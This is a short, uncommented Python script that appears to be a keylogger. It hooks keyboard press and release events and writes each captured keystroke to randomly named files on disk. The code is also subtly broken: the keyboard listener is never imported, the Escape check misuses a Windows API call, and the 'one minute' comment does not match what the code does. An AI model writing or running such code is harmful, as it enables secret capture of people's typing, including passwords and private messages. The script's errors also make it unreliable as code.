```python
import ctypes
import os
import random
import string
import time

def get_random_string(length):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(length))

def on_press(key):
    try:
        with open(get_random_string(10), 'a') as f:
            if hasattr(key, 'char'):
                f.write(key.char)
            else:
                f.write('[{}]'.format(key))
    except Exception as e:
        print("Error occurred while writing to file:", str(e))

def on_release(key):
    if key == ctypes.windll.user32.VkKeyScanW('esc'):
        return False

time.sleep(60)  # Listen for keyboard events for 1 minute
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
```